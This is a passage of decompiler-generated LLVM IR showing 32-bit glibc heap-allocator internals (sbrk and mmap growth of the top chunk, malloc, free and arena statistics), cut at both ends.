  store i32 %v5_8052d03, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805305f

dec_label_pc_8052d0c:                             ; preds = %dec_label_pc_8052cd5
  %v0_8052d0c = load i32, i32* @global_var_8061bbc.500, align 4
  store i32 %v0_8052d0c, i32* %edx.global-to-local, align 4
  %v0_8052d12 = load i8, i8* @global_var_8061860.494, align 32
  %v1_8052d12 = and i8 %v0_8052d12, 2
  %v2_8052d12 = icmp eq i8 %v1_8052d12, 0
  br i1 %v2_8052d12, label %dec_label_pc_8052d40, label %dec_label_pc_8052d1b

dec_label_pc_8052d1b:                             ; preds = %dec_label_pc_8052d0c
  store i32 ptrtoint (i8* @global_var_8061860.494 to i32), i32* %stack_var_-92, align 4
  %v2_8052d23 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8061860.494 to i32*))
  store i32 ptrtoint (i8* @global_var_8061860.494 to i32), i32* @ebx, align 4
  %v1_8052d2d = add i32 %v1_8052d6a, -7
  store i32 %v1_8052d2d, i32* %eax.global-to-local, align 4
  store i32 %v1_8052d2d, i32* %stack_var_-92, align 4
  %v1_8052d31 = call i32 @malloc(i32 %v1_8052d2d)
  store i32 %v1_8052d31, i32* %eax.global-to-local, align 4
  store i32 %v1_8052d31, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80530cf

dec_label_pc_8052d40:                             ; preds = %dec_label_pc_8052d0c
  %v1_8052d40 = add i32 %v0_8052d0c, -1
  store i32 %v1_8052d40, i32* @ecx, align 4
  store i32 %v1_8052d6a, i32* @ebx, align 4
  %v1_8052d4b = load i32, i32* @global_var_8061bac.501, align 4
  %v7_8052d4b = icmp ult i32 %v1_8052d6a, %v1_8052d4b
  br i1 %v7_8052d4b, label %dec_label_pc_8052e0d, label %dec_label_pc_8052d57

dec_label_pc_8052d57:                             ; preds = %dec_label_pc_8052d40
  %v0_8052d57 = load i32, i32* @global_var_8061bb0.502, align 16
  store i32 %v0_8052d57, i32* %eax.global-to-local, align 4
  %v1_8052d5c = load i32, i32* @global_var_8061bb4.503, align 4
  %v5_8052d62 = icmp slt i32 %v0_8052d57, %v1_8052d5c
  br i1 %v5_8052d62, label %dec_label_pc_8052d68, label %dec_label_pc_8052e0d

dec_label_pc_8052d68:                             ; preds = %dec_label_pc_8052d57
  %v2_8052d6a = add i32 %v1_8052d6a, 10
  %v3_8052d6a = add i32 %v2_8052d6a, %v0_8052d0c
  %v1_8052d6e = sub i32 0, %v0_8052d0c
  store i32 %v1_8052d6e, i32* %eax.global-to-local, align 4
  %v2_8052d70 = and i32 %v3_8052d6a, %v1_8052d6e
  store i32 %v2_8052d70, i32* @ebx, align 4
  %tmp129 = icmp ugt i32 %v2_8052d70, %v1_8052d6a
  br i1 %tmp129, label %dec_label_pc_8052d7c, label %dec_label_pc_8052e0d

dec_label_pc_8052d7c:                             ; preds = %dec_label_pc_8052d68
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8052d89 = call i32 @mmap(i32 0, i32 %v2_8052d70, i32 3, i32 34, i32 0, i32 0, i32 %v1_8052d40, i32 %v1_8052d40)
  store i32 %v8_8052d89, i32* %eax.global-to-local, align 4
  store i32 %v8_8052d89, i32* @edx, align 4
  %v10_8052d93 = icmp eq i32 %v8_8052d89, -1
  br i1 %v10_8052d93, label %dec_label_pc_8052d7c.dec_label_pc_8052e0d_crit_edge, label %dec_label_pc_8052d98

dec_label_pc_8052d7c.dec_label_pc_8052e0d_crit_edge: ; preds = %dec_label_pc_8052d7c
  %v0_8052e0d.pre = load i32, i32* @global_var_806188c.495, align 4
  br label %dec_label_pc_8052e0d

dec_label_pc_8052d98:                             ; preds = %dec_label_pc_8052d7c
  %v1_8052d9a = urem i32 %v8_8052d89, 8
  %v2_8052d9a = icmp eq i32 %v1_8052d9a, 0
  store i32 %v1_8052d9a, i32* @ecx, align 4
  br i1 %v2_8052d9a, label %dec_label_pc_8052db2, label %dec_label_pc_8052d9f

dec_label_pc_8052d9f:                             ; preds = %dec_label_pc_8052d98
  %v0_8052da4 = load i32, i32* @ebx, align 4
  %v2_8052da6 = sub nsw i32 8, %v1_8052d9a
  store i32 %v2_8052da6, i32* %eax.global-to-local, align 4
  %v2_8052da8 = add i32 %v2_8052da6, %v8_8052d89
  store i32 %v2_8052da8, i32* @edx, align 4
  %v2_8052daa = sub i32 %v0_8052da4, %v2_8052da6
  store i32 %v2_8052daa, i32* %esi.global-to-local, align 4
  %v2_8052dac = inttoptr i32 %v2_8052da8 to i32*
  store i32 %v2_8052da6, i32* %v2_8052dac, align 4
  br label %dec_label_pc_8052dba

dec_label_pc_8052db2:                             ; preds = %dec_label_pc_8052d98
  %v1_8052db2 = inttoptr i32 %v8_8052d89 to i32*
  store i32 0, i32* %v1_8052db2, align 4
  br label %dec_label_pc_8052dba

dec_label_pc_8052dba:                             ; preds = %dec_label_pc_8052d9f, %dec_label_pc_8052db2
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_8052d9f ], [ @ebx, %dec_label_pc_8052db2 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_8052dba = or i32 %storemerge, 2
  %v1_8052dbd = load i32, i32* @edx, align 4
  %v2_8052dbd = add i32 %v1_8052dbd, 4
  %v3_8052dbd = inttoptr i32 %v2_8052dbd to i32*
  store i32 %v1_8052dba, i32* %v3_8052dbd, align 4
  %v0_8052dc0 = load i32, i32* @global_var_8061bb0.502, align 16
  %v1_8052dc5 = add i32 %v0_8052dc0, 1
  store i32 %v1_8052dc5, i32* %eax.global-to-local, align 4
  store i32 %v1_8052dc5, i32* @global_var_8061bb0.502, align 16
  %v1_8052dcb = load i32, i32* @global_var_8061bb8.504, align 8
  %v7_8052dd1 = icmp sgt i32 %v1_8052dc5, %v1_8052dcb
  br i1 %v7_8052dd1, label %dec_label_pc_8052dd3, label %dec_label_pc_8052dd8

dec_label_pc_8052dd3:                             ; preds = %dec_label_pc_8052dba
  store i32 %v1_8052dc5, i32* @global_var_8061bb8.504, align 8
  br label %dec_label_pc_8052dd8

dec_label_pc_8052dd8:                             ; preds = %dec_label_pc_8052dba, %dec_label_pc_8052dd3
  %v0_8052dd8 = load i32, i32* @global_var_8061bc4.505, align 4
  %v1_8052ddd = load i32, i32* @ebx, align 4
  %v2_8052ddd = add i32 %v1_8052ddd, %v0_8052dd8
  store i32 %v2_8052ddd, i32* %eax.global-to-local, align 4
  store i32 %v2_8052ddd, i32* @global_var_8061bc4.505, align 4
  %v1_8052de4 = load i32, i32* @global_var_8061bd0.506, align 16
  %tmp130 = icmp ugt i32 %v2_8052ddd, %v1_8052de4
  br i1 %tmp130, label %dec_label_pc_8052dec, label %dec_label_pc_8052df1

dec_label_pc_8052dec:                             ; preds = %dec_label_pc_8052dd8
  store i32 %v2_8052ddd, i32* @global_var_8061bd0.506, align 16
  br label %dec_label_pc_8052df1

dec_label_pc_8052df1:                             ; preds = %dec_label_pc_8052dd8, %dec_label_pc_8052dec
  %v1_8052df1 = load i32, i32* @global_var_8061bc8.507, align 8
  %v2_8052df1 = add i32 %v1_8052df1, %v2_8052ddd
  store i32 %v2_8052df1, i32* %eax.global-to-local, align 4
  %v1_8052df7 = load i32, i32* @global_var_8061bd4.508, align 4
  %tmp131 = icmp ugt i32 %v2_8052df1, %v1_8052df7
  br i1 %tmp131, label %dec_label_pc_8052e03, label %dec_label_pc_8052a54

dec_label_pc_8052e03:                             ; preds = %dec_label_pc_8052df1
  store i32 %v2_8052df1, i32* @global_var_8061bd4.508, align 4
  br label %dec_label_pc_8052a54

dec_label_pc_8052e0d:                             ; preds = %dec_label_pc_8052d68, %dec_label_pc_8052d7c.dec_label_pc_8052e0d_crit_edge, %dec_label_pc_8052d57, %dec_label_pc_8052d40
  %v0_8052e0d = phi i32 [ %v0_8052e0d.pre, %dec_label_pc_8052d7c.dec_label_pc_8052e0d_crit_edge ], [ %v0_8052cd5, %dec_label_pc_8052d57 ], [ %v0_8052cd5, %dec_label_pc_8052d68 ], [ %v0_8052cd5, %dec_label_pc_8052d40 ]
  store i32 %v0_8052e0d, i32* %eax.global-to-local, align 4
  %v1_8052e16 = add i32 %v0_8052e0d, 4
  %v2_8052e16 = inttoptr i32 %v1_8052e16 to i32*
  %v3_8052e16 = load i32, i32* %v2_8052e16, align 4
  %v1_8052e20 = and i32 %v3_8052e16, -4
  %v2_8052e20 = icmp eq i32 %v1_8052e20, 0
  store i32 %v1_8052e20, i32* @ebp, align 4
  %v1_8052e23 = load i32, i32* @global_var_8061ba8.509, align 8
  %v2_8052e23 = add i32 %v1_8052e23, %v1_8052cdf
  store i32 %v2_8052e23, i32* %eax.global-to-local, align 4
  %v0_8052e29 = load i8, i8* @global_var_8061bc0.510, align 64
  %v1_8052e29 = urem i8 %v0_8052e29, 2
  %v2_8052e29 = icmp eq i8 %v1_8052e29, 0
  br i1 %v2_8052e29, label %dec_label_pc_8052e34, label %dec_label_pc_8052e32

dec_label_pc_8052e32:                             ; preds = %dec_label_pc_8052e0d
  %v2_8052e32 = sub i32 %v2_8052e23, %v1_8052e20
  store i32 %v2_8052e32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052e34

dec_label_pc_8052e34:                             ; preds = %dec_label_pc_8052e0d, %dec_label_pc_8052e32
  %v0_8052e38 = phi i32 [ %v2_8052e23, %dec_label_pc_8052e0d ], [ %v2_8052e32, %dec_label_pc_8052e32 ]
  %v5_8052e38 = add i32 %v0_8052e38, %v1_8052d40
  store i32 %v5_8052e38, i32* %eax.global-to-local, align 4
  %v1_8052e3c = sub i32 0, %v0_8052d0c
  store i32 %v1_8052e3c, i32* @edx, align 4
  %v2_8052e44 = and i32 %v5_8052e38, %v1_8052e3c
  store i32 %v2_8052e44, i32* @esi, align 4
  %tmp88 = icmp slt i32 %v2_8052e44, 1
  br i1 %tmp88, label %dec_label_pc_8052e5e, label %dec_label_pc_8052e48

dec_label_pc_8052e48:                             ; preds = %dec_label_pc_8052e34
  store i32 %v2_8052e44, i32* %stack_var_-92, align 4
  %v1_8052e4c = call i32 @__GI_sbrk(i32 %v2_8052e44)
  store i32 %v1_8052e4c, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  store i32 %v1_8052e4c, i32* @ebx, align 4
  %v10_8052e59 = icmp eq i32 %v1_8052e4c, -1
  %v1_8052e5c = icmp eq i1 %v10_8052e59, false
  br i1 %v1_8052e5c, label %dec_label_pc_8052eb4.dec_label_pc_8052ebd_crit_edge, label %dec_label_pc_8052e48.dec_label_pc_8052e5e_crit_edge

dec_label_pc_8052e48.dec_label_pc_8052e5e_crit_edge: ; preds = %dec_label_pc_8052e48
  %v0_8052e5e.pre = load i8, i8* @global_var_8061bc0.510, align 64
  br label %dec_label_pc_8052e5e

dec_label_pc_8052e5e:                             ; preds = %dec_label_pc_8052e48.dec_label_pc_8052e5e_crit_edge, %dec_label_pc_8052e34
  %v0_8052e8a = phi i32 [ -1, %dec_label_pc_8052e48.dec_label_pc_8052e5e_crit_edge ], [ %v1_8052e3c, %dec_label_pc_8052e34 ]
  %v0_8052e5e = phi i8 [ %v0_8052e5e.pre, %dec_label_pc_8052e48.dec_label_pc_8052e5e_crit_edge ], [ %v0_8052e29, %dec_label_pc_8052e34 ]
  %v1_8052e5e = urem i8 %v0_8052e5e, 2
  %v2_8052e5e = icmp eq i8 %v1_8052e5e, 0
  br i1 %v2_8052e5e, label %dec_label_pc_8052e5e.dec_label_pc_8052e73_crit_edge, label %dec_label_pc_8052e67

dec_label_pc_8052e5e.dec_label_pc_8052e73_crit_edge: ; preds = %dec_label_pc_8052e5e
  %v0_8052e73.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052e73

dec_label_pc_8052e67:                             ; preds = %dec_label_pc_8052e5e
  %v2_8052e6b = add i32 %v1_8052e20, %v1_8052d40
  store i32 %v2_8052e6b, i32* %eax.global-to-local, align 4
  %v0_8052e6d = load i32, i32* @esi, align 4
  %v2_8052e6d = add i32 %v0_8052e6d, %v2_8052e6b
  %v5_8052e6f = and i32 %v2_8052e6d, %v1_8052e3c
  store i32 %v5_8052e6f, i32* @esi, align 4
  br label %dec_label_pc_8052e73

dec_label_pc_8052e73:                             ; preds = %dec_label_pc_8052e5e.dec_label_pc_8052e73_crit_edge, %dec_label_pc_8052e67
  %v0_8052e73 = phi i32 [ %v0_8052e73.pre, %dec_label_pc_8052e5e.dec_label_pc_8052e73_crit_edge ], [ %v5_8052e6f, %dec_label_pc_8052e67 ]
  %tmp132 = icmp ult i32 %v0_8052e73, 1048576
  br i1 %tmp132, label %dec_label_pc_8052e7b, label %dec_label_pc_8052e80

dec_label_pc_8052e7b:                             ; preds = %dec_label_pc_8052e73
  store i32 1048576, i32* @esi, align 4
  br label %dec_label_pc_8052e80

dec_label_pc_8052e80:                             ; preds = %dec_label_pc_8052e73, %dec_label_pc_8052e7b
  %v0_8052e94 = phi i32 [ %v0_8052e73, %dec_label_pc_8052e73 ], [ 1048576, %dec_label_pc_8052e7b ]
  %tmp133 = icmp ugt i32 %v0_8052e94, %v1_8052d6a
  br i1 %tmp133, label %dec_label_pc_8052e8a, label %dec_label_pc_80530c2

dec_label_pc_8052e8a:                             ; preds = %dec_label_pc_8052e80
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8052e97 = call i32 @mmap(i32 0, i32 %v0_8052e94, i32 3, i32 34, i32 0, i32 0, i32 %v0_8052e8a, i32 %v0_8052e8a)
  store i32 %v8_8052e97, i32* %eax.global-to-local, align 4
  store i32 %v8_8052e97, i32* @ebx, align 4
  %v10_8052ea1 = icmp eq i32 %v8_8052e97, -1
  br i1 %v10_8052ea1, label %dec_label_pc_80530c2, label %dec_label_pc_8052eb4.thread

dec_label_pc_8052eb4.thread:                      ; preds = %dec_label_pc_8052e8a
  %v0_8052eaa = load i8, i8* @global_var_8061bc0.510, align 1
  %v2_8052eaa = and i8 %v0_8052eaa, -2
  store i8 %v2_8052eaa, i8* @global_var_8061bc0.510, align 64
  %v1_8052eb1 = load i32, i32* @esi, align 4
  %v2_8052eb1 = add i32 %v1_8052eb1, %v8_8052e97
  store i32 %v2_8052eb1, i32* @edx, align 4
  br label %dec_label_pc_8052ebd

dec_label_pc_8052eb4.dec_label_pc_8052ebd_crit_edge: ; preds = %dec_label_pc_8052e48
  %v1_8052ec1.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052ebd

dec_label_pc_8052ebd:                             ; preds = %dec_label_pc_8052eb4.dec_label_pc_8052ebd_crit_edge, %dec_label_pc_8052eb4.thread
  %v1_8052ec1 = phi i32 [ %v1_8052eb1, %dec_label_pc_8052eb4.thread ], [ %v1_8052ec1.pre, %dec_label_pc_8052eb4.dec_label_pc_8052ebd_crit_edge ]
  %v0_8052f8992 = phi i32 [ %v8_8052e97, %dec_label_pc_8052eb4.thread ], [ %v1_8052e4c, %dec_label_pc_8052eb4.dec_label_pc_8052ebd_crit_edge ]
  %v0_8052f7b91 = phi i32 [ %v2_8052eb1, %dec_label_pc_8052eb4.thread ], [ -1, %dec_label_pc_8052eb4.dec_label_pc_8052ebd_crit_edge ]
  %v0_8052ec1 = load i32, i32* @global_var_8061bc8.507, align 8
  %v2_8052ec1 = add i32 %v1_8052ec1, %v0_8052ec1
  store i32 %v2_8052ec1, i32* @global_var_8061bc8.507, align 8
  %v2_8052ec7 = add i32 %v1_8052e20, %v0_8052e0d
  store i32 %v2_8052ec7, i32* %ecx.global-to-local, align 4
  %v2_8052ec9 = sub i32 %v0_8052f8992, %v2_8052ec7
  %v7_8052ec9 = icmp ult i32 %v0_8052f8992, %v2_8052ec7
  %v12_8052ec9 = icmp eq i32 %v2_8052ec9, 0
  %v1_8052ecb = icmp eq i1 %v12_8052ec9, false
  br i1 %v1_8052ecb, label %dec_label_pc_8052ee4, label %dec_label_pc_8052ecd

dec_label_pc_8052ecd:                             ; preds = %dec_label_pc_8052ebd
  %v10_8052ecd = icmp eq i32 %v0_8052f7b91, -1
  %v1_8052ed0 = icmp eq i1 %v10_8052ecd, false
  br i1 %v1_8052ed0, label %dec_label_pc_8052ee4, label %dec_label_pc_8052ed2

dec_label_pc_8052ed2:                             ; preds = %dec_label_pc_8052ecd
  %v2_8052ed2 = add i32 %v1_8052ec1, %v1_8052e20
  store i32 %v0_8052e0d, i32* %ecx.global-to-local, align 4
  %v1_8052ed9 = or i32 %v2_8052ed2, 1
  store i32 %v1_8052ed9, i32* %eax.global-to-local, align 4
  store i32 %v1_8052ed9, i32* %v2_8052e16, align 4
  br label %dec_label_pc_8053011

dec_label_pc_8052ee4:                             ; preds = %dec_label_pc_8052ecd, %dec_label_pc_8052ebd
  %v0_8052ee4 = load i8, i8* @global_var_8061bc0.510, align 1
  %v1_8052ee4 = sext i8 %v0_8052ee4 to i32
  store i32 %v1_8052ee4, i32* %eax.global-to-local, align 4
  %v2_8052ee9 = urem i8 %v0_8052ee4, 2
  %v3_8052ee9 = icmp eq i8 %v2_8052ee9, 0
  br i1 %v3_8052ee9, label %dec_label_pc_8052efd, label %dec_label_pc_8052eed

dec_label_pc_8052eed:                             ; preds = %dec_label_pc_8052ee4
  br i1 %v2_8052e20, label %dec_label_pc_8052efd, label %dec_label_pc_8052ef1

dec_label_pc_8052ef1:                             ; preds = %dec_label_pc_8052eed
  %v1_8052ef3 = icmp eq i1 %v7_8052ec9, false
  br i1 %v1_8052ef3, label %dec_label_pc_8052efd, label %dec_label_pc_8052ef5

dec_label_pc_8052ef5:                             ; preds = %dec_label_pc_8052ef1
  %v1_8052ef5 = and i32 %v1_8052ee4, -2
  %v4_8052ef5 = trunc i32 %v1_8052ef5 to i8
  store i32 %v1_8052ef5, i32* %eax.global-to-local, align 4
  store i8 %v4_8052ef5, i8* @global_var_8061bc0.510, align 64
  br label %dec_label_pc_8052efd

dec_label_pc_8052efd:                             ; preds = %dec_label_pc_8052ef1, %dec_label_pc_8052eed, %dec_label_pc_8052ee4, %dec_label_pc_8052ef5
  %v0_8052efd = phi i8 [ %v0_8052ee4, %dec_label_pc_8052ef1 ], [ %v0_8052ee4, %dec_label_pc_8052eed ], [ %v0_8052ee4, %dec_label_pc_8052ee4 ], [ %v4_8052ef5, %dec_label_pc_8052ef5 ]
  %v1_8052efd = urem i8 %v0_8052efd, 2
  %v2_8052efd = icmp eq i8 %v1_8052efd, 0
  br i1 %v2_8052efd, label %dec_label_pc_8052f7b, label %dec_label_pc_8052f06

dec_label_pc_8052f06:                             ; preds = %dec_label_pc_8052efd
  br i1 %v2_8052e20, label %dec_label_pc_8052f14, label %dec_label_pc_8052f0a

dec_label_pc_8052f0a:                             ; preds = %dec_label_pc_8052f06
  store i32 %v2_8052ec9, i32* %eax.global-to-local, align 4
  %v2_8052f0e = add i32 %v2_8052ec1, %v2_8052ec9
  store i32 %v2_8052f0e, i32* @global_var_8061bc8.507, align 8
  br label %dec_label_pc_8052f14

dec_label_pc_8052f14:                             ; preds = %dec_label_pc_8052f06, %dec_label_pc_8052f0a
  %v1_8052f16 = urem i32 %v0_8052f8992, 8
  %v2_8052f16 = icmp eq i32 %v1_8052f16, 0
  store i32 %v1_8052f16, i32* %edx.global-to-local, align 4
  %v1_8052f19 = icmp eq i1 %v2_8052f16, false
  br i1 %v1_8052f19, label %dec_label_pc_8052f21, label %dec_label_pc_8052f1b

dec_label_pc_8052f1b:                             ; preds = %dec_label_pc_8052f14
  store i32 %v0_8052f8992, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052f2b

dec_label_pc_8052f21:                             ; preds = %dec_label_pc_8052f14
  %v2_8052f26 = sub nsw i32 8, %v1_8052f16
  store i32 %v2_8052f26, i32* %eax.global-to-local, align 4
  %v2_8052f28 = add i32 %v2_8052f26, %v0_8052f8992
  store i32 %v2_8052f28, i32* @edi, align 4
  br label %dec_label_pc_8052f2b

dec_label_pc_8052f2b:                             ; preds = %dec_label_pc_8052f1b, %dec_label_pc_8052f21
  %v0_8052f2e = phi i32 [ 0, %dec_label_pc_8052f1b ], [ %v2_8052f26, %dec_label_pc_8052f21 ]
  %v2_8052f2b = add i32 %v1_8052ec1, %v0_8052f8992
  %v2_8052f2e = add i32 %v0_8052f2e, %v1_8052e20
  store i32 %v2_8052f2e, i32* %ecx.global-to-local, align 4
  %v2_8052f37 = add i32 %v2_8052f2e, %v2_8052f2b
  store i32 %v2_8052f37, i32* %edx.global-to-local, align 4
  %v2_8052f3d = add i32 %v2_8052f37, %v1_8052d40
  %v5_8052f40 = and i32 %v2_8052f3d, %v1_8052e3c
  %v2_8052f47 = sub i32 %v5_8052f40, %v2_8052f37
  store i32 %v2_8052f47, i32* %eax.global-to-local, align 4
  %v2_8052f49 = add i32 %v2_8052f47, %v2_8052f2e
  store i32 %v2_8052f49, i32* @esi, align 4
  store i32 %v2_8052f49, i32* %stack_var_-92, align 4
  %v1_8052f4d = call i32 @__GI_sbrk(i32 %v2_8052f49)
  store i32 %v1_8052f4d, i32* %eax.global-to-local, align 4
  store i32 %v1_8052f4d, i32* @edx, align 4
  %v10_8052f57 = icmp eq i32 %v1_8052f4d, -1
  %v1_8052f5a = icmp eq i1 %v10_8052f57, false
  br i1 %v1_8052f5a, label %dec_label_pc_8052f6a, label %dec_label_pc_8052f5c

dec_label_pc_8052f5c:                             ; preds = %dec_label_pc_8052f2b
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8052f61 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8052f61, i32* %eax.global-to-local, align 4
  store i32 %v1_8052f61, i32* @edx, align 4
  br label %dec_label_pc_8052f9e

dec_label_pc_8052f6a:                             ; preds = %dec_label_pc_8052f2b
  %v1_8052f6a = load i32, i32* @ebx, align 4
  %v7_8052f6a = icmp ult i32 %v1_8052f4d, %v1_8052f6a
  %v1_8052f6c = icmp eq i1 %v7_8052f6a, false
  br i1 %v1_8052f6c, label %dec_label_pc_8052fa3, label %dec_label_pc_8052f6e

dec_label_pc_8052f6e:                             ; preds = %dec_label_pc_8052f6a
  %v0_8052f6e = load i8, i8* @global_var_8061bc0.510, align 1
  %v2_8052f6e = and i8 %v0_8052f6e, -2
  store i8 %v2_8052f6e, i8* @global_var_8061bc0.510, align 64
  store i32 %v2_8052f2b, i32* @edx, align 4
  br label %dec_label_pc_8052f82

dec_label_pc_8052f7b:                             ; preds = %dec_label_pc_8052efd
  %v10_8052f7b = icmp eq i32 %v0_8052f7b91, -1
  br i1 %v10_8052f7b, label %dec_label_pc_8052f86, label %dec_label_pc_8052f80

dec_label_pc_8052f80:                             ; preds = %dec_label_pc_8052f7b
  store i32 %v0_8052f8992, i32* @edi, align 4
  br label %dec_label_pc_8052f82

dec_label_pc_8052f82:                             ; preds = %dec_label_pc_8052f6e, %dec_label_pc_8052f80
  %v0_8052fa349 = phi i32 [ %v2_8052f2b, %dec_label_pc_8052f6e ], [ %v0_8052f7b91, %dec_label_pc_8052f80 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8052fa3

dec_label_pc_8052f86:                             ; preds = %dec_label_pc_8052f7b
  store i32 %v0_8052f8992, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8052f8d = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8052f8d, i32* @edx, align 4
  %v1_8052f94 = load i32, i32* @ebx, align 4
  %v2_8052f94 = sub i32 %v1_8052f8d, %v1_8052f94
  %v1_8052f96 = load i32, i32* @esi, align 4
  %v2_8052f96 = sub i32 %v2_8052f94, %v1_8052f96
  store i32 %v2_8052f96, i32* %eax.global-to-local, align 4
  %v0_8052f98 = load i32, i32* @global_var_8061bc8.507, align 8
  %v2_8052f98 = add i32 %v0_8052f98, %v2_8052f96
  store i32 %v2_8052f98, i32* @global_var_8061bc8.507, align 8
  br label %dec_label_pc_8052f9e

dec_label_pc_8052f9e:                             ; preds = %dec_label_pc_8052f5c, %dec_label_pc_8052f86
  %v0_8052fa348 = phi i32 [ %v1_8052f61, %dec_label_pc_8052f5c ], [ %v1_8052f8d, %dec_label_pc_8052f86 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8052fa3

dec_label_pc_8052fa3:                             ; preds = %dec_label_pc_8052f6a, %dec_label_pc_8052f82, %dec_label_pc_8052f9e
  %v0_8052fa8 = phi i32 [ %v1_8052f4d, %dec_label_pc_8052f6a ], [ %v0_8052fa349, %dec_label_pc_8052f82 ], [ %v0_8052fa348, %dec_label_pc_8052f9e ]
  %v10_8052fa3 = icmp eq i32 %v0_8052fa8, -1
  br i1 %v10_8052fa3, label %dec_label_pc_8053011, label %dec_label_pc_8052fa8

dec_label_pc_8052fa8:                             ; preds = %dec_label_pc_8052fa3
  %v1_8052fa8 = load i32, i32* @edi, align 4
  %v2_8052fa8 = sub i32 %v0_8052fa8, %v1_8052fa8
  store i32 %v2_8052fa8, i32* @edx, align 4
  store i32 %v1_8052fa8, i32* @global_var_806188c.495, align 4
  %v1_8052fb0 = load i32, i32* @esi, align 4
  %v2_8052fb0 = add i32 %v1_8052fb0, %v2_8052fa8
  %v1_8052fb3 = or i32 %v2_8052fb0, 1
  store i32 %v1_8052fb3, i32* %eax.global-to-local, align 4
  %v2_8052fb6 = add i32 %v1_8052fa8, 4
  %v3_8052fb6 = inttoptr i32 %v2_8052fb6 to i32*
  store i32 %v1_8052fb3, i32* %v3_8052fb6, align 4
  %v0_8052fb9 = load i32, i32* @global_var_8061bc8.507, align 8
  %v1_8052fb9 = load i32, i32* @esi, align 4
  %v2_8052fb9 = add i32 %v1_8052fb9, %v0_8052fb9
  store i32 %v2_8052fb9, i32* @global_var_8061bc8.507, align 8
  br i1 %v2_8052e20, label %dec_label_pc_8053011, label %dec_label_pc_8052fc3

dec_label_pc_8052fc3:                             ; preds = %dec_label_pc_8052fa8
  %v1_8052fc3 = add i32 %v1_8052e20, -12
  store i32 %v0_8052e0d, i32* %ecx.global-to-local, align 4
  %v1_8052fca = and i32 %v1_8052fc3, -8
  store i32 %v1_8052fca, i32* %eax.global-to-local, align 4
  %v1_8052fcf = or i32 %v1_8052fca, 1
  store i32 %v1_8052fcf, i32* @edx, align 4
  %v5_8052fd2 = icmp ult i32 %v1_8052fca, 15
  store i32 %v1_8052fcf, i32* %v2_8052e16, align 4
  %v0_8052fd8 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052fd8 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052fd8 = add i32 %v0_8052fd8, 4
  %v3_8052fd8 = add i32 %v2_8052fd8, %v1_8052fd8
  %v4_8052fd8 = inttoptr i32 %v3_8052fd8 to i32*
  store i32 5, i32* %v4_8052fd8, align 4
  %v0_8052fe0 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052fe0 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052fe0 = add i32 %v0_8052fe0, 8
  %v3_8052fe0 = add i32 %v2_8052fe0, %v1_8052fe0
  %v4_8052fe0 = inttoptr i32 %v3_8052fe0 to i32*
  store i32 5, i32* %v4_8052fe0, align 4
  br i1 %v5_8052fd2, label %dec_label_pc_8053011, label %dec_label_pc_8052fea

dec_label_pc_8052fea:                             ; preds = %dec_label_pc_8052fc3
  %v0_8052fed = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052fef = add i32 %v0_8052fed, 8
  store i32 %v1_8052fef, i32* %eax.global-to-local, align 4
  %v0_8052ff2 = load i32, i32* @global_var_8061ba4.511, align 4
  store i32 %v0_8052ff2, i32* @ebx, align 4
  store i32 %v1_8052fef, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8061ba4.511, align 4
  %v1_8053003 = call i32 @free(i32 %v1_8052fef)
  store i32 %v1_8053003, i32* %eax.global-to-local, align 4
  %v0_8053008 = load i32, i32* @ebx, align 4
  store i32 %v0_8053008, i32* @global_var_8061ba4.511, align 4
  br label %dec_label_pc_8053011

dec_label_pc_8053011:                             ; preds = %dec_label_pc_8052fc3, %dec_label_pc_8052fa8, %dec_label_pc_8052fa3, %dec_label_pc_8052ed2, %dec_label_pc_8052fea
  %v0_8053011 = load i32, i32* @global_var_8061bc8.507, align 8
  store i32 %v0_8053011, i32* %eax.global-to-local, align 4
  %v1_8053016 = load i32, i32* @global_var_8061bcc.512, align 4
  %tmp134 = icmp ugt i32 %v0_8053011, %v1_8053016
  br i1 %tmp134, label %dec_label_pc_805301e, label %dec_label_pc_8053023

dec_label_pc_805301e:                             ; preds = %dec_label_pc_8053011
  store i32 %v0_8053011, i32* @global_var_8061bcc.512, align 4
  br label %dec_label_pc_8053023

dec_label_pc_8053023:                             ; preds = %dec_label_pc_8053011, %dec_label_pc_805301e
  %v1_8053023 = load i32, i32* @global_var_8061bc4.505, align 4
  %v2_8053023 = add i32 %v1_8053023, %v0_8053011
  store i32 %v2_8053023, i32* %eax.global-to-local, align 4
  %v1_8053029 = load i32, i32* @global_var_8061bd4.508, align 4
  %tmp135 = icmp ugt i32 %v2_8053023, %v1_8053029
  br i1 %tmp135, label %dec_label_pc_8053031, label %dec_label_pc_8053036

dec_label_pc_8053031:                             ; preds = %dec_label_pc_8053023
  store i32 %v2_8053023, i32* @global_var_8061bd4.508, align 4
  br label %dec_label_pc_8053036

dec_label_pc_8053036:                             ; preds = %dec_label_pc_8053023, %dec_label_pc_8053031
  %v0_8053036 = load i32, i32* @global_var_806188c.495, align 4
  store i32 %v0_8053036, i32* @ebx, align 4
  %v1_805303c = add i32 %v0_8053036, 4
  %v2_805303c = inttoptr i32 %v1_805303c to i32*
  %v3_805303c = load i32, i32* %v2_805303c, align 4
  %v1_805303f = and i32 %v3_805303c, -4
  store i32 %v1_805303f, i32* @ecx, align 4
  %v10_8053042 = icmp ult i32 %v1_805303f, %v1_8052cdf
